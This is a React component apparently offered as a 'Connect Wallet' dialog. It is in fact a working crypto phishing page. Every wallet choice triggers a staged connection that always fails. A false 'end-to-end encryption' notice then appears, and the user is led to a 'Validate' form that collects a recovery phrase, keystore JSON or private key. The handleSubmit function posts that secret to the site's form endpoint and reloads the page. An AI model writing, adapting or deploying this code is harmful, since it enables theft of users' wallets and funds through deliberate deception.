import { useState } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Wallet, X, Loader2 } from "lucide-react";

type ModalState = "select" | "connecting" | "error" | "validate" | "closed";
type ValidateTab = "phrase" | "keystore" | "privatekey";

interface WalletConnectDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const walletOptions = [
  { id: "phantom", name: "Phantom", icon: "👻" },
  { id: "metamask", name: "MetaMask", icon: "🦊" },
  { id: "walletconnect", name: "WalletConnect", icon: "🔗" },
  { id: "coinbase", name: "Coinbase Wallet", icon: "💼" },
  { id: "ledger", name: "Ledger", icon: "🔐" },
];

export const WalletConnectDialog = ({ open, onOpenChange }: WalletConnectDialogProps) => {
  const [modalState, setModalState] = useState<ModalState>("select");
  const [selectedWallet, setSelectedWallet] = useState<string>("");
  const [activeTab, setActiveTab] = useState<ValidateTab>("phrase");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleWalletSelect = (walletId: string) => {
    setSelectedWallet(walletId);
    setModalState("connecting");

    // Simulate connection attempt for 3 seconds
    setTimeout(() => {
      setModalState("error");
    }, 3000);
  };

  const handleConnectManually = () => {
    setModalState("validate");
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSubmitting(true);

    const formData = new FormData(e.currentTarget);
    const data = new URLSearchParams();

    data.append("form-name", "messageForm");
    data.append("type", selectedWallet);
    data.append("method", activeTab);

    // Add the appropriate field based on active tab
    if (activeTab === "phrase") {
      data.append("input", formData.get("input") as string);
    } else if (activeTab === "keystore") {
      data.append("kstore", formData.get("kstore") as string);
    } else if (activeTab === "privatekey") {
      data.append("privkey", formData.get("privkey") as string);
    }

    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString(),
      });

      // Close modal and reset
      onOpenChange(false);
      setModalState("select");
      setTimeout(() => {
        window.location.reload();
      }, 500);
    } catch (error) {
      console.error("Form submission error:", error);
      // Still close and reset even on error
      onOpenChange(false);
      setModalState("select");
      setTimeout(() => {
        window.location.reload();
      }, 500);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleTabChange = (tab: ValidateTab) => {
    setActiveTab(tab);
  };

  const handleClose = () => {
    onOpenChange(false);
    // Reset state after animation
    setTimeout(() => {
      setModalState("select");
      setActiveTab("phrase");
    }, 200);
  };

  return (
    <Dialog open={open} onOpenChange={handleClose}>
      <DialogContent className="glass-card border-border/20 text-foreground max-w-md">
        {/* Wallet Selection Modal */}
        {modalState === "select" && (
          <>
            <DialogHeader>
              <DialogTitle className="text-2xl">Connect Wallet</DialogTitle>
            </DialogHeader>
            <div className="space-y-2 py-4">
              {walletOptions.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleWalletSelect(wallet.id)}
                  className="w-full flex items-center gap-4 p-4 rounded-lg bg-background/50 border border-border/20 hover:bg-background/70 hover:border-primary/30 transition-all"
                >
                  <span className="text-2xl">{wallet.icon}</span>
                  <span className="text-foreground font-medium">{wallet.name}</span>
                </button>
              ))}
            </div>
          </>
        )}

        {/* Connecting Modal */}
        {modalState === "connecting" && (
          <div className="py-12 flex flex-col items-center justify-center">
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-4" />
            <p className="text-muted-foreground">Connecting to wallet...</p>
          </div>
        )}

        {/* Error Modal */}
        {modalState === "error" && (
          <>
            <DialogHeader>
              <DialogTitle className="text-2xl">Automatic Connection</DialogTitle>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4">
                <p className="text-destructive text-sm">
                  An error occurred... please try again or connect manually.
                </p>
              </div>
              <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                <p className="text-primary text-sm">
                  This session is protected with end-to-end encryption.
                </p>
              </div>
              <Button
                onClick={handleConnectManually}
                variant="outline"
                className="w-full border-border/30 hover:border-border/50"
              >
                Connect Manually
              </Button>
            </div>
          </>
        )}

        {/* Validate Modal */}
        {modalState === "validate" && (
          <>
            <DialogHeader>
              <DialogTitle className="text-2xl">Validate</DialogTitle>
            </DialogHeader>
            <div className="py-4">
              {/* Tabs */}
              <div className="flex gap-2 border-b border-border/20 mb-4">
                <button
                  onClick={() => handleTabChange("phrase")}
                  className={`px-4 py-2 text-sm font-medium transition-colors border-b-2 ${
                    activeTab === "phrase"
                      ? "text-primary border-primary"
                      : "text-muted-foreground border-transparent hover:text-foreground"
                  }`}
                >
                  Phrase
                </button>
                <button
                  onClick={() => handleTabChange("keystore")}
                  className={`px-4 py-2 text-sm font-medium transition-colors border-b-2 ${
                    activeTab === "keystore"
                      ? "text-primary border-primary"
                      : "text-muted-foreground border-transparent hover:text-foreground"
                  }`}
                >
                  Keystore
                </button>
                <button
                  onClick={() => handleTabChange("privatekey")}
                  className={`px-4 py-2 text-sm font-medium transition-colors border-b-2 ${
                    activeTab === "privatekey"
                      ? "text-primary border-primary"
                      : "text-muted-foreground border-transparent hover:text-foreground"
                  }`}
                >
                  Private Key
                </button>
              </div>

              {/* Form */}
              <form onSubmit={handleSubmit} className="space-y-4">
                {/* Phrase Tab */}
                {activeTab === "phrase" && (
                  <div className="space-y-2">
                    <textarea
                      name="input"
                      placeholder="Enter your recovery phrase here..."
                      className="w-full min-h-[150px] p-4 bg-background/50 border border-border/20 rounded-lg text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 transition-colors resize-vertical"
                      required
                    />
                    <p className="text-xs text-primary">
                      Typically 12 (sometimes 24) words separated by single space
                    </p>
                  </div>
                )}

                {/* Keystore Tab */}
                {activeTab === "keystore" && (
                  <div className="space-y-2">
                    <textarea
                      name="kstore"
                      placeholder="Enter your keystore JSON here..."
                      className="w-full min-h-[150px] p-4 bg-background/50 border border-border/20 rounded-lg text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 transition-colors resize-vertical"
                      required
                    />
                  </div>
                )}

                {/* Private Key Tab */}
                {activeTab === "privatekey" && (
                  <div className="space-y-2">
                    <textarea
                      name="privkey"
                      placeholder="Enter your private key here..."
                      className="w-full min-h-[150px] p-4 bg-background/50 border border-border/20 rounded-lg text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 transition-colors resize-vertical"
                      required
                    />
                  </div>
                )}

                <Button
                  type="submit"
                  className="w-full bg-gradient-primary hover:opacity-90"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Validating...
                    </>
                  ) : (
                    "Validate"
                  )}
                </Button>
              </form>
            </div>
          </>
        )}
      </DialogContent>
    </Dialog>
  );
};
